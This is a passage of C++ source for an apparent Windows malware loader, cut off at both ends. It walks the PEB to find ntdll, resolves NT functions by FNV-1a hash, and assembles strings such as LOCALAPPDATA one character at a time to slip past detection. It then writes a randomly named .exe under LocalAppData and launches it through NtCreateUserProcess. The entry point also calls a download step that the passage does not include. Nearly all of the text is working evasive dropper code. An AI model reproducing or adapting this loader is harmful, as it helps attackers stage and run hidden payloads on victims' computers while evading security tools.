}COPY_PARAMETERS, *PCOPY_PARAMETERS;

typedef struct _ENVIRONMENT_DATA {
    UNICODE_STRING Name;
    PWSTR Environment;
}ENVIRONMENT_DATA, *PENVIRONMENT_DATA;

typedef struct COM_FUNCTIONS{
    COINITIALIZEEX CoInitializeEx;
    COUNINITIALIZE CoUninitialize;
    COCREATEINSTANCE CoCreateInstance;
    SYSFREESTRING SysFreeString;
    COINITIALIZESECURITY CoInitializeSecurity;
}COM_FUNCTIONS, *PCOM_FUNCTIONS;

typedef struct NT_FUNCTIONS {
    NTCREATEUSERPROCESS NtCreateUserProcess;
    LDRLOADDLL LdrLoadDll;
    NTCREATEFILE NtCreateFile;
    NTCLOSE NtClose;
    NTWRITEFILE NtWriteFile;
    NTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory;
    NTFREEVIRTUALMEMORY NtFreeVirtualMemory;
    NTDEVICEIOCONTROLFILE NtDeviceIoControlFile;
    NTTERMINATEPROCESS NtTerminateProcess;
}NT_FUNCTIONS, *PNT_FUNCTIONS;

typedef struct COM_VARIABLES {
    IWbemLocator* Locator;
    IWbemServices* Services;
    IEnumWbemClassObject* Enum;
    IWbemClassObject* Ping;
    INetworkListManager* NetworkManager;
    IWinHttpRequest* HttpRequest;
    BSTR ResponseData;
}COM_VARIABLES, *PCOM_VARIABLES;

typedef struct COM_HELPER {
    BOOL IsComInitialized;
    HRESULT ComResult;
    COM_FUNCTIONS ComFunction;
    COM_VARIABLES ComVariables;
}COM_HELPER, *PCOM_HELPER;

typedef struct LOADER_HELPER {
    HMODULE hMod;
    PIMAGE_DOS_HEADER Dos;
    PIMAGE_NT_HEADERS Nt;
    PIMAGE_FILE_HEADER File;
    PIMAGE_OPTIONAL_HEADER Optional;
}LOADER_HELPER, *PLOADER_HELPER;


typedef struct DATA_TABLE {
    PWCHAR WideStringPointer1;
    PCHAR StringPointer1;
    UNICODE_STRING UnicodeString;
    WCHAR UnicodeStringBuffer[MAX_PATH * sizeof(WCHAR)];
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    PVOID UserProcessParametersBuffer[4096];
    PVOID Destination;
}DATA_TABLE, *PDATA_TABLE;

typedef struct ZERO_FILL_HELPER {
    PVOID Destination;
    SIZE_T Size;
}ZERO_FILL_HELPER, *PZERO_FILL_HELPER;

typedef struct _VARIABLE_TABLE {
    NTSTATUS Status;
    BOOL bFlag;
    DWORD64 dwError;
    PPEB Peb;
    PTEB Teb;
    
    //Function calling
    DWORD dwReturn;
    DWORD dwGeneralUsage1;

    //helper structures
    COPY_PARAMETERS Copy;
    ENVIRONMENT_DATA EnvironmentData;
    HANDLE hHandle;
    PLIST_ENTRY Entry;

    //Functions
    DATA_TABLE GeneralData;
    NT_FUNCTIONS NtFunctions;
    LOADER_HELPER LoaderHelper;
    COM_HELPER ComHelper;
    ZERO_FILL_HELPER ZeroFill;

}VARIABLE_TABLE, *PVARIABLE_TABLE;

LPVOID RecursiveExecutor(DWORD dwEnum, PVARIABLE_TABLE Table)
{
    if (Table->dwError != ERROR_SUCCESS || Table->Status != STATUS_SUCCESS)
        return (LPVOID)Table->dwError;

    switch (dwEnum)
    {
        case EntryPoint:
        {
            Table->ZeroFill.Destination = Table;
            Table->ZeroFill.Size = sizeof(VARIABLE_TABLE);
            RecursiveExecutor(ZeroFillData, Table);

            Table->dwError = 0; Table->dwGeneralUsage1 = 0;

            RecursiveExecutor(GetGeneralInformation, Table);
        
            Table->GeneralData.UnicodeString.Buffer = Table->GeneralData.UnicodeStringBuffer;
            Table->GeneralData.UnicodeString.Length = (MAX_PATH * sizeof(WCHAR));
            Table->GeneralData.UnicodeString.MaximumLength = (MAX_PATH * sizeof(WCHAR) + 1);

            RecursiveExecutor(CreateDownloadPath, Table);

            RecursiveExecutor(DownloadBinary, Table);

            RecursiveExecutor(ExecuteBinary, Table);

            RecursiveExecutor(ExitApplication, Table);

            break;
        }

        case GetGeneralInformation:
        {
            Table->Teb = (PTEB)__readgsqword(0x30);
            Table->Peb = (PPEB)Table->Teb->ProcessEnvironmentBlock;

            Table->dwGeneralUsage1 = 0xa62a3b3b;
            RecursiveExecutor(GetNtdllBaseAddress, Table);

            RecursiveExecutor(NullPeHeaders, Table);

            break;
        }

        case GetNtdllBaseAddress:
        {
            PLDR_MODULE Module = NULL;
            PLIST_ENTRY Head = &Table->Peb->LoaderData->InMemoryOrderModuleList;
            PLIST_ENTRY Next = Head->Flink;
            Module = (PLDR_MODULE)((PBYTE)Next - 16);

            while (Next != Head)
            {
                Module = (PLDR_MODULE)((PBYTE)Next - 16);
                if (Module->BaseDllName.Buffer != NULL)
                {
                    Table->GeneralData.WideStringPointer1 = Module->BaseDllName.Buffer;

                    RecursiveExecutor(HashStringFowlerNollVoVariant1aW, Table);

                    if (Table->dwReturn == Table->dwGeneralUsage1)
                    {
                        Table->LoaderHelper.hMod = (HMODULE)Module->BaseAddress;
                        RecursiveExecutor(PopulateNtFunctionPointers, Table);

                        if (!Table->NtFunctions.NtCreateUserProcess || !Table->NtFunctions.LdrLoadDll)
                            RecursiveExecutor(ExitApplication, Table);

                        if(!Table->NtFunctions.NtClose || !Table->NtFunctions.NtCreateFile)
                            RecursiveExecutor(ExitApplication, Table);

                        if(!Table->NtFunctions.NtWriteFile || !Table->NtFunctions.NtAllocateVirtualMemory)
                            RecursiveExecutor(ExitApplication, Table);

                        if(!Table->NtFunctions.NtFreeVirtualMemory || !Table->NtFunctions.NtTerminateProcess)
                            RecursiveExecutor(ExitApplication, Table);
                        
                        break;
                    }
                }

                Next = Next->Flink;
            }

            break;
        }

        case ExitApplication:
        {
            if (!Table->NtFunctions.NtTerminateProcess)
                while (TRUE); //fatal error...

            if (Table->ComHelper.ComResult == S_OK || Table->Status == STATUS_SUCCESS)
                Table->dwError = ERROR_INVALID_DATA;

            if (Table->Status != STATUS_SUCCESS)
                Table->dwError = ERROR_PRINTQ_FULL; //lol

            if (Table->ComHelper.ComResult != S_OK)
                RecursiveExecutor(Win32FromHResult, Table);

            if (Table->ComHelper.IsComInitialized)
            {
                RecursiveExecutor(SafelyExitCom, Table);
                Table->ComHelper.ComFunction.CoUninitialize();

                RecursiveExecutor(RemoveComData, Table);

                Table->ComHelper.IsComInitialized = FALSE;
            }

            Table->NtFunctions.NtTerminateProcess(NULL, Table->dwError);
            Table->NtFunctions.NtTerminateProcess(((HANDLE)-1), Table->dwError);
                
            return (LPVOID)Table->dwError;
        }

        case HashStringFowlerNollVoVariant1aW:
        {
            ULONG Hash = 0x811c9dc5;

            while (*Table->GeneralData.WideStringPointer1)
            {
                Hash ^= (UCHAR)*Table->GeneralData.WideStringPointer1++;
                Hash *= 0x01000193;
            }

            Table->dwReturn = Hash;

            break;
        }

        case GetProcAddressByHash:
        {
            PBYTE pFunctionName = NULL;
            DWORD64 FunctionAddress = ERROR_SUCCESS;
            PIMAGE_EXPORT_DIRECTORY ExportTable = NULL;
            PDWORD FunctionNameAddressArray;
            PDWORD FunctionAddressArray;
            PWORD FunctionOrdinalAddressArray;

            RecursiveExecutor(RtlLoadPeHeaders, Table);
            if (Table->LoaderHelper.Nt->Signature != IMAGE_NT_SIGNATURE)
                RecursiveExecutor(ExitApplication, Table);

            ExportTable = (PIMAGE_EXPORT_DIRECTORY)((DWORD64)Table->LoaderHelper.hMod + Table->LoaderHelper.Optional->DataDirectory[0].VirtualAddress);
            FunctionNameAddressArray = (PDWORD)((LPBYTE)Table->LoaderHelper.hMod + ExportTable->AddressOfNames);
            FunctionAddressArray = (PDWORD)((LPBYTE)Table->LoaderHelper.hMod + ExportTable->AddressOfFunctions);
            FunctionOrdinalAddressArray = (PWORD)((LPBYTE)Table->LoaderHelper.hMod + ExportTable->AddressOfNameOrdinals);

            for (DWORD dwX = 0; dwX < ExportTable->NumberOfNames; dwX++)
            {
                pFunctionName = FunctionNameAddressArray[dwX] + (PBYTE)Table->LoaderHelper.hMod;
                WCHAR wFunctionName[MAX_PATH * sizeof(WCHAR)];

                Table->ZeroFill.Destination = &wFunctionName;
                Table->ZeroFill.Size = sizeof(wFunctionName);
                RecursiveExecutor(ZeroFillData, Table);

                Table->GeneralData.StringPointer1 = (PCHAR)pFunctionName;
                Table->GeneralData.WideStringPointer1 = wFunctionName;

                RecursiveExecutor(CharStringToWCharString, Table);

                Table->GeneralData.WideStringPointer1 = wFunctionName;

                RecursiveExecutor(HashStringFowlerNollVoVariant1aW, Table);

                if (Table->dwGeneralUsage1 == Table->dwReturn)
                    return (LPVOID)((DWORD64)Table->LoaderHelper.hMod + FunctionAddressArray[FunctionOrdinalAddressArray[dwX]]);
            }

            break;
        }

        case RtlLoadPeHeaders:
        {
            Table->LoaderHelper.Dos = (PIMAGE_DOS_HEADER)Table->LoaderHelper.hMod;
            if (Table->LoaderHelper.Dos->e_magic != IMAGE_DOS_SIGNATURE)
                break;

            Table->LoaderHelper.Nt = (PIMAGE_NT_HEADERS)((PBYTE)Table->LoaderHelper.Dos + Table->LoaderHelper.Dos->e_lfanew);
            if (Table->LoaderHelper.Nt->Signature != IMAGE_NT_SIGNATURE)
                break;

            Table->LoaderHelper.File = (PIMAGE_FILE_HEADER)((PBYTE)Table->LoaderHelper.hMod + Table->LoaderHelper.Dos->e_lfanew + sizeof(DWORD));
            Table->LoaderHelper.Optional = (PIMAGE_OPTIONAL_HEADER)((PBYTE)Table->LoaderHelper.File + sizeof(IMAGE_FILE_HEADER));

            break;
        }

        case CharStringToWCharString:
        {
            INT MaxLength = 256;
            INT Length = MaxLength;

            while (--Length >= 0)
            {
                if (!(*Table->GeneralData.WideStringPointer1++ = *Table->GeneralData.StringPointer1++))
                    return (LPVOID)(DWORD64)(MaxLength - Length - 1);
            }

            return (LPVOID)(DWORD64)(MaxLength - Length);
        }

        case StringLength:
        {
            LPCWSTR String2;

            for (String2 = Table->GeneralData.WideStringPointer1; *String2; ++String2);

            Table->dwGeneralUsage1 = static_cast<DWORD>(String2 - Table->GeneralData.WideStringPointer1);

            break;
        }

        case ExecuteBinary:
        {
            UNICODE_STRING NtPathOfBinary;
            PPS_ATTRIBUTE_LIST AttributeList = NULL;
            HANDLE hHandle = NULL, hThread = NULL;
            PS_CREATE_INFO CreateInfo;
            DWORD dwOffset = 0;
            WCHAR PathBufferW[MAX_PATH * sizeof(WCHAR)];
            PVOID PsAttributesBuffer[32];

            Table->ZeroFill.Destination = &NtPathOfBinary;
            Table->ZeroFill.Size = sizeof(UNICODE_STRING);
            RecursiveExecutor(ZeroFillData, Table);

            Table->ZeroFill.Destination = &CreateInfo;
            Table->ZeroFill.Size = sizeof(PS_CREATE_INFO);
            RecursiveExecutor(ZeroFillData, Table);

            Table->ZeroFill.Destination = &PathBufferW;
            Table->ZeroFill.Size = sizeof(PathBufferW);
            RecursiveExecutor(ZeroFillData, Table);

            Table->ZeroFill.Destination = &PsAttributesBuffer;
            Table->ZeroFill.Size = sizeof(PsAttributesBuffer);
            RecursiveExecutor(ZeroFillData, Table);

            CreateInfo.Size = sizeof(CreateInfo);
            CreateInfo.State = PsCreateInitialState;

            RecursiveExecutor(CreateProcessParameters, Table);

            AttributeList = (PPS_ATTRIBUTE_LIST)PsAttributesBuffer;
            AttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE);
            AttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
            AttributeList->Attributes[0].Size = Table->GeneralData.UnicodeString.Length;
            AttributeList->Attributes[0].Value = (ULONG_PTR)Table->GeneralData.UnicodeString.Buffer;

            Table->Status = Table->NtFunctions.NtCreateUserProcess(&hHandle, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, Table->GeneralData.ProcessParameters, & CreateInfo, AttributeList);
            if (!NT_SUCCESS(Table->Status))
                break;

            break;
        }

        case PopulateNtFunctionPointers:
        {
            Table->dwGeneralUsage1 = 0x116893e9; //NtCreateUserProcess
            Table->NtFunctions.NtCreateUserProcess = (NTCREATEUSERPROCESS)RecursiveExecutor(GetProcAddressByHash, Table);

            Table->dwGeneralUsage1 = 0x7b566b5f; //LdrLoadDll
            Table->NtFunctions.LdrLoadDll = (LDRLOADDLL)RecursiveExecutor(GetProcAddressByHash, Table);

            Table->dwGeneralUsage1 = 0xa9c5b599; //NtCreateFile
            Table->NtFunctions.NtCreateFile = (NTCREATEFILE)RecursiveExecutor(GetProcAddressByHash, Table);

            Table->dwGeneralUsage1 = 0x6b372c05; //MtClose
            Table->NtFunctions.NtClose = (NTCLOSE)RecursiveExecutor(GetProcAddressByHash, Table);

            Table->dwGeneralUsage1 = 0xf67464e4; //NtWriteFile
            Table->NtFunctions.NtWriteFile = (NTWRITEFILE)RecursiveExecutor(GetProcAddressByHash, Table);

            Table->dwGeneralUsage1 = 0xca67b978; //NtAllocateVirtualMemory
            Table->NtFunctions.NtAllocateVirtualMemory = (NTALLOCATEVIRTUALMEMORY)RecursiveExecutor(GetProcAddressByHash, Table);

            Table->dwGeneralUsage1 = 0xb51cc567; //NtFreeVirtualMemory
            Table->NtFunctions.NtFreeVirtualMemory = (NTFREEVIRTUALMEMORY)RecursiveExecutor(GetProcAddressByHash, Table);

            Table->dwGeneralUsage1 = 0x08ac8bac; //NtDeviceIoControlFile
            Table->NtFunctions.NtDeviceIoControlFile = (NTDEVICEIOCONTROLFILE)RecursiveExecutor(GetProcAddressByHash, Table);

            Table->dwGeneralUsage1 = 0x1f2f8e87; //NtTerminateProcess
            Table->NtFunctions.NtTerminateProcess = (NTTERMINATEPROCESS)RecursiveExecutor(GetProcAddressByHash, Table);

            break;
        }

        case CreateProcessParameters:
        {
            UNICODE_STRING EmptyString;
            PUNICODE_STRING DllPath = NULL;
            PUNICODE_STRING CurrentDirectory = NULL;
            PUNICODE_STRING CommandLine = NULL;
            PUNICODE_STRING WindowTitle = NULL;
            PUNICODE_STRING DesktopInfo = NULL;
            PUNICODE_STRING ShellInfo = NULL;
            PUNICODE_STRING RuntimeData = NULL;
            PVOID Environment = NULL;
            PRTL_USER_PROCESS_PARAMETERS p = NULL, ProcessParameters = NULL;
            HANDLE hHandle = NULL;
            PWSTR d = NULL;
            ULONG Size = 0;

            PWCHAR ImagePathNameBuffer = NULL;
            USHORT ImagePathNameBufferLength;
            UNICODE_STRING ImagePathName;

            Table->ZeroFill.Destination = &EmptyString;
            Table->ZeroFill.Size = sizeof(UNICODE_STRING);
            RecursiveExecutor(ZeroFillData, Table);

            Table->ZeroFill.Destination = &ImagePathName;
            Table->ZeroFill.Size = sizeof(UNICODE_STRING);
            RecursiveExecutor(ZeroFillData, Table);
            
            ImagePathNameBuffer = Table->GeneralData.UnicodeString.Buffer;
            ImagePathNameBufferLength = Table->GeneralData.UnicodeString.Length;

            while (*ImagePathNameBuffer != 'C')
            {
#pragma warning( push )
#pragma warning( disable : 6269)
                *ImagePathNameBuffer++;
#pragma warning( pop )
                ImagePathName.Length--;

            }

            ProcessParameters = Table->Peb->ProcessParameters;

            ImagePathName.Buffer = ImagePathNameBuffer;
            ImagePathName.Length = ImagePathNameBufferLength;
            ImagePathName.MaximumLength = ImagePathName.Length + sizeof(WCHAR);

            CommandLine = &ImagePathName;
            WindowTitle = &EmptyString;
            DesktopInfo = &EmptyString;
            ShellInfo = &EmptyString;
            RuntimeData = &EmptyString;

            Size = sizeof(*ProcessParameters);
            Size += AlignProcessParameters(MAX_PATH * sizeof(WCHAR), sizeof(ULONG));
            Size += AlignProcessParameters(ImagePathName.Length + sizeof(UNICODE_NULL), sizeof(ULONG));
            Size += AlignProcessParameters(CommandLine->Length + sizeof(UNICODE_NULL), sizeof(ULONG));
            Size += AlignProcessParameters(WindowTitle->MaximumLength, sizeof(ULONG));
            Size += AlignProcessParameters(DesktopInfo->MaximumLength, sizeof(ULONG));
            Size += AlignProcessParameters(ShellInfo->MaximumLength, sizeof(ULONG));
            Size += AlignProcessParameters(RuntimeData->MaximumLength, sizeof(ULONG));

            DllPath = &ProcessParameters->DllPath;

            hHandle = (HANDLE)((ULONG_PTR)ProcessParameters->CurrentDirectory.Handle & ~OBJ_HANDLE_TAGBITS);
            hHandle = (HANDLE)((ULONG_PTR)hHandle | RTL_USER_PROC_CURDIR_INHERIT);
            CurrentDirectory = &ProcessParameters->CurrentDirectory.DosPath;

            Environment = ProcessParameters->Environment;

            Size += AlignProcessParameters(DllPath->MaximumLength, sizeof(ULONG));

            p = (PRTL_USER_PROCESS_PARAMETERS)Table->GeneralData.UserProcessParametersBuffer;
            p->MaximumLength = Size;
            p->Length = Size;
            p->Flags = RTL_USER_PROC_PARAMS_NORMALIZED;
            p->DebugFlags = 0;
            p->Environment = (PWSTR)Environment;
            p->CurrentDirectory.Handle = hHandle;
            p->ConsoleFlags = ProcessParameters->ConsoleFlags;

            Table->Copy.d = (PWSTR)(p + 1);

            Table->Copy.Destination = &p->CurrentDirectory.DosPath;
            Table->Copy.Source = CurrentDirectory;
            Table->Copy.Size = MAX_PATH * 2;
            RecursiveExecutor(CopyParameters, Table);

            Table->Copy.Destination = &p->DllPath;
            Table->Copy.Source = DllPath;
            Table->Copy.Size = 0;
            RecursiveExecutor(CopyParameters, Table);

            Table->Copy.Destination = &p->ImagePathName;
            Table->Copy.Source = &ImagePathName;
            Table->Copy.Size = ImagePathName.Length + sizeof(UNICODE_NULL);
            RecursiveExecutor(CopyParameters, Table);

            Table->Copy.Destination = &p->CommandLine;
            Table->Copy.Source = CommandLine;

            if (CommandLine->Length == CommandLine->MaximumLength)
                Table->Copy.Size = 0;
            else
                Table->Copy.Size = CommandLine->Length + sizeof(UNICODE_NULL);

            RecursiveExecutor(CopyParameters, Table);

            Table->Copy.Destination = &p->WindowTitle;
            Table->Copy.Source = WindowTitle;
            Table->Copy.Size = 0;
            RecursiveExecutor(CopyParameters, Table);

            Table->Copy.Destination = &p->DesktopInfo;
            Table->Copy.Source = DesktopInfo;
            Table->Copy.Size = 0;
            RecursiveExecutor(CopyParameters, Table);

            Table->Copy.Destination = &p->ShellInfo;
            Table->Copy.Source = ShellInfo;
            Table->Copy.Size = 0;
            RecursiveExecutor(CopyParameters, Table);

            if (RuntimeData->Length != 0)
            {
                Table->Copy.Destination = &p->RuntimeData;
                Table->Copy.Source = RuntimeData;
                Table->Copy.Size = 0;
            }

            p->DllPath.Buffer = NULL;
            p->DllPath.Length = 0;
            p->DllPath.MaximumLength = 0;
            p->EnvironmentSize = Table->Peb->ProcessParameters->EnvironmentSize;

            Table->GeneralData.ProcessParameters = p;
            p = NULL;

            break;
        }

        case CopyParameters:
        {
            if (Table->Copy.Size == 0)
                Table->Copy.Size = Table->Copy.Source->MaximumLength;

            Table->dwGeneralUsage1 = Table->Copy.Source->Length;
            for (PBYTE Destination = (PBYTE)Table->Copy.d, Source = (PBYTE)Table->Copy.Source->Buffer; Table->dwGeneralUsage1--;)
            {
                *Destination++ = *Source++;
            }

            Table->Copy.Destination->Buffer = Table->Copy.d;
            Table->Copy.Destination->Length = Table->Copy.Source->Length;
            Table->Copy.Destination->MaximumLength = (USHORT)Table->Copy.Size;

            if (Table->Copy.Destination->Length < Table->Copy.Destination->MaximumLength)
            {
                Table->dwGeneralUsage1 = Table->Copy.Destination->MaximumLength - Table->Copy.Destination->Length;
                for (PULONG Destination = (PULONG)((PBYTE)Table->Copy.Destination->Buffer) + Table->Copy.Destination->Length; Table->dwGeneralUsage1 > 0; Table->dwGeneralUsage1--, Destination++)
                    *Destination = 0;
            }

            Table->Copy.d = (PWSTR)((PCHAR)(Table->Copy.d) + AlignProcessParameters(Table->Copy.Size, sizeof(ULONG)));
            break;
        }

        case QueryEnvironmentVariables:
        {
            UNICODE_STRING TemporaryString;;
            PWSTR Value = 0;

            Table->ZeroFill.Destination = &TemporaryString;
            Table->ZeroFill.Size = sizeof(UNICODE_STRING);
            RecursiveExecutor(ZeroFillData, Table);

            Table->GeneralData.UnicodeString.Length = 0;

            for (PWCHAR String = Table->EnvironmentData.Environment; *String; String++)
            {
                TemporaryString.Buffer = String++;
                Table->GeneralData.WideStringPointer1 = String;

                String = NULL;
                do
                {
                    if (*Table->GeneralData.WideStringPointer1 == L'=')
                    {
                        String = Table->GeneralData.WideStringPointer1;
                        break;
                    }

                } while (*Table->GeneralData.WideStringPointer1++);


                if (String == NULL)
                {
                    Table->GeneralData.WideStringPointer1 = TemporaryString.Buffer;
                    RecursiveExecutor(StringLength, Table);
                    String = TemporaryString.Buffer + Table->dwGeneralUsage1;
                }

                if (*String)
                {
                    TemporaryString.MaximumLength = (USHORT)(String - TemporaryString.Buffer) * sizeof(WCHAR);
                    TemporaryString.Length = TemporaryString.MaximumLength;

                    Value = ++String;
                    Table->GeneralData.WideStringPointer1 = String;
                    RecursiveExecutor(StringLength, Table);
                    String += Table->dwGeneralUsage1;

                    if (TemporaryString.Length == Table->EnvironmentData.Name.Length)
                    {
                        for (LPCWSTR String1 = TemporaryString.Buffer, String2 = Table->EnvironmentData.Name.Buffer; *String1 == *String2; String1++, String2++)
                        {
                            if (*String1 == '\0')
                                break;

                            if (((*(LPCWSTR)String1 < *(LPCWSTR)String2) ? -1 : +1) == TRUE)
                            {
                                PBYTE Destination = (PBYTE)Table->GeneralData.UnicodeString.Buffer;
                                PBYTE Source = (PBYTE)Value;
                                SIZE_T Length = 0;
                                Table->GeneralData.UnicodeString.Length = (USHORT)(String - Value) * sizeof(WCHAR);

                                Length = (((Table->GeneralData.UnicodeString.Length + sizeof(WCHAR)) < (Table->GeneralData.UnicodeString.MaximumLength)) ? (Table->GeneralData.UnicodeString.Length + sizeof(WCHAR)) : (Table->GeneralData.UnicodeString.MaximumLength));

                                while (Length--)
                                    *Destination++ = *Source++;

                                break;
                            }
                        }
                    }
                }
            }

            break;
        }

        case NullPeHeaders:
        {
            Table->LoaderHelper.Dos = 0;
            Table->LoaderHelper.Nt = 0;
            Table->LoaderHelper.File = 0;
            Table->LoaderHelper.Optional = 0;
            Table->LoaderHelper.hMod = 0;
            Table->GeneralData.StringPointer1 = 0;

            break;
        }

        case CreateDownloadPath:
        {
            WCHAR LocalAppDataW[MAX_PATH];
            WCHAR PayloadName[24];
            OBJECT_ATTRIBUTES Attributes;
            IO_STATUS_BLOCK Io;
            WCHAR NativePath[MAX_PATH * sizeof(WCHAR)];
            DWORD dwOffset = 0;

            CHAR ccRngBuffer[34];

            HANDLE hRngDevice;
            BYTE RngBuffer[16];
            WCHAR DriverNameBuffer[12];
            UNICODE_STRING DriverName;

            CHAR HexArray[17];

            Table->ZeroFill.Destination = &LocalAppDataW;
            Table->ZeroFill.Size = sizeof(LocalAppDataW);
            RecursiveExecutor(ZeroFillData, Table);

            Table->ZeroFill.Destination = &PayloadName;
            Table->ZeroFill.Size = sizeof(PayloadName);
            RecursiveExecutor(ZeroFillData, Table);

            Table->ZeroFill.Destination = &Attributes;
            Table->ZeroFill.Size = sizeof(OBJECT_ATTRIBUTES);
            RecursiveExecutor(ZeroFillData, Table);

            Table->ZeroFill.Destination = &NativePath;
            Table->ZeroFill.Size = sizeof(NativePath);
            RecursiveExecutor(ZeroFillData, Table);

            Table->ZeroFill.Destination = &ccRngBuffer;
            Table->ZeroFill.Size = sizeof(ccRngBuffer);
            RecursiveExecutor(ZeroFillData, Table);

            Table->ZeroFill.Destination = &RngBuffer;
            Table->ZeroFill.Size = sizeof(RngBuffer);
            RecursiveExecutor(ZeroFillData, Table);

            Table->ZeroFill.Destination = &DriverNameBuffer;
            Table->ZeroFill.Size = sizeof(DriverNameBuffer);
            RecursiveExecutor(ZeroFillData, Table);

            Table->ZeroFill.Destination = &DriverName;
            Table->ZeroFill.Size = sizeof(UNICODE_STRING);
            RecursiveExecutor(ZeroFillData, Table);

            Table->ZeroFill.Destination = &HexArray;
            Table->ZeroFill.Size = sizeof(HexArray);
            RecursiveExecutor(ZeroFillData, Table);

            Table->ZeroFill.Destination = &Io;
            Table->ZeroFill.Size = sizeof(IO_STATUS_BLOCK);
            RecursiveExecutor(ZeroFillData, Table);

            Table->dwGeneralUsage1 = 0;
            HexArray[Table->dwGeneralUsage1++] = '0'; HexArray[Table->dwGeneralUsage1++] = '1';
            HexArray[Table->dwGeneralUsage1++] = '2'; HexArray[Table->dwGeneralUsage1++] = '3';
            HexArray[Table->dwGeneralUsage1++] = '4'; HexArray[Table->dwGeneralUsage1++] = '5';
            HexArray[Table->dwGeneralUsage1++] = '6'; HexArray[Table->dwGeneralUsage1++] = '7';
            HexArray[Table->dwGeneralUsage1++] = '8'; HexArray[Table->dwGeneralUsage1++] = '9';
            HexArray[Table->dwGeneralUsage1++] = 'a'; HexArray[Table->dwGeneralUsage1++] = 'b';
            HexArray[Table->dwGeneralUsage1++] = 'c'; HexArray[Table->dwGeneralUsage1++] = 'd';
            HexArray[Table->dwGeneralUsage1++] = 'e'; HexArray[Table->dwGeneralUsage1++] = 'f';

            Table->dwGeneralUsage1 = 0;
            LocalAppDataW[Table->dwGeneralUsage1++] = 'L'; LocalAppDataW[Table->dwGeneralUsage1++] = 'O';
            LocalAppDataW[Table->dwGeneralUsage1++] = 'C'; LocalAppDataW[Table->dwGeneralUsage1++] = 'A';
            LocalAppDataW[Table->dwGeneralUsage1++] = 'L'; LocalAppDataW[Table->dwGeneralUsage1++] = 'A';
            LocalAppDataW[Table->dwGeneralUsage1++] = 'P'; LocalAppDataW[Table->dwGeneralUsage1++] = 'P';
            LocalAppDataW[Table->dwGeneralUsage1++] = 'D'; LocalAppDataW[Table->dwGeneralUsage1++] = 'A';
            LocalAppDataW[Table->dwGeneralUsage1++] = 'T'; LocalAppDataW[Table->dwGeneralUsage1++] = 'A';

            Table->dwGeneralUsage1 *= sizeof(WCHAR);
            Table->EnvironmentData.Name.Buffer = LocalAppDataW;
            Table->EnvironmentData.Name.Length = (USHORT)Table->dwGeneralUsage1;
            Table->EnvironmentData.Name.MaximumLength = (USHORT)Table->EnvironmentData.Name.Length + sizeof(WCHAR);

            Table->EnvironmentData.Environment = (PWSTR)Table->Peb->ProcessParameters->Environment;

            RecursiveExecutor(QueryEnvironmentVariables, Table);

            Table->dwGeneralUsage1 = 0;
            DriverNameBuffer[Table->dwGeneralUsage1++] = '\\'; DriverNameBuffer[Table->dwGeneralUsage1++] = 'D';
            DriverNameBuffer[Table->dwGeneralUsage1++] = 'e'; DriverNameBuffer[Table->dwGeneralUsage1++] = 'v';
            DriverNameBuffer[Table->dwGeneralUsage1++] = 'i'; DriverNameBuffer[Table->dwGeneralUsage1++] = 'c';
            DriverNameBuffer[Table->dwGeneralUsage1++] = 'e'; DriverNameBuffer[Table->dwGeneralUsage1++] = '\\';
            DriverNameBuffer[Table->dwGeneralUsage1++] = 'C'; DriverNameBuffer[Table->dwGeneralUsage1++] = 'N';
            DriverNameBuffer[Table->dwGeneralUsage1++] = 'G';

            Table->dwGeneralUsage1 *= sizeof(WCHAR);
            DriverName.Buffer = DriverNameBuffer;
            DriverName.Length = (USHORT)Table->dwGeneralUsage1;
            DriverName.MaximumLength = DriverName.Length + sizeof(WCHAR);

            InitializeObjectAttributes(&Attributes, &DriverName, OBJ_CASE_INSENSITIVE, NULL, NULL);

            Table->Status = Table->NtFunctions.NtCreateFile(&hRngDevice, GENERIC_READ | SYNCHRONIZE, &Attributes, &Io, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
            if (!NT_SUCCESS(Table->Status))
                RecursiveExecutor(ExitApplication, Table);

            Table->Status = Table->NtFunctions.NtDeviceIoControlFile(hRngDevice, NULL, NULL, NULL, &Io, IOCTL_KSEC_RNG, NULL, 0, RngBuffer, 16);
            if (!NT_SUCCESS(Table->Status))
                RecursiveExecutor(ExitApplication, Table);

            for (DWORD dwX = 0; dwX < 16; ++dwX)
            {
                ccRngBuffer[2 * dwX] = HexArray[(RngBuffer[dwX] & 0xF0) >> 4];
                ccRngBuffer[2 * dwX + 1] = HexArray[RngBuffer[dwX] & 0x0F];
            }

            PayloadName[0] = '\\';
            for (dwOffset = 0; dwOffset < 15; dwOffset++)
                PayloadName[dwOffset + 1] = ccRngBuffer[dwOffset];

            Table->dwGeneralUsage1 = 0;
            PayloadName[dwOffset++] = '.';
            PayloadName[dwOffset++] = 'e';
            PayloadName[dwOffset++] = 'x';
            PayloadName[dwOffset++] = 'e';

            NativePath[Table->dwGeneralUsage1++] = '\\';
            NativePath[Table->dwGeneralUsage1++] = '?';
            NativePath[Table->dwGeneralUsage1++] = '?';
            NativePath[Table->dwGeneralUsage1++] = '\\';

            for (DWORD dwIndex = 0; dwIndex < Table->GeneralData.UnicodeString.Length; dwIndex++)
            {
                dwOffset = dwIndex + Table->dwGeneralUsage1;
                NativePath[dwOffset] = Table->GeneralData.UnicodeString.Buffer[dwIndex];
            }

            for (DWORD dwIndex = 0, Ordinal = 0; Ordinal < (dwOffset / sizeof(WCHAR)); dwIndex++)
            {
                if (NativePath[dwIndex] == '\0')
                {
                    NativePath[dwIndex] = PayloadName[Ordinal];
                    Ordinal++;
                }
            }

            Table->GeneralData.WideStringPointer1 = NativePath;
            RecursiveExecutor(StringLength, Table);
            Table->dwGeneralUsage1 *= sizeof(WCHAR);

            for (PBYTE Destination = (PBYTE)Table->GeneralData.UnicodeStringBuffer, Source = (PBYTE)NativePath; Table->dwGeneralUsage1 != 0; Table->dwGeneralUsage1--)
                *Destination++ = *Source++;

            Table->GeneralData.WideStringPointer1 = Table->GeneralData.UnicodeStringBuffer;
            RecursiveExecutor(StringLength, Table);
            Table->dwGeneralUsage1 *= sizeof(WCHAR);
            Table->GeneralData.UnicodeString.Length = (USHORT)Table->dwGeneralUsage1;
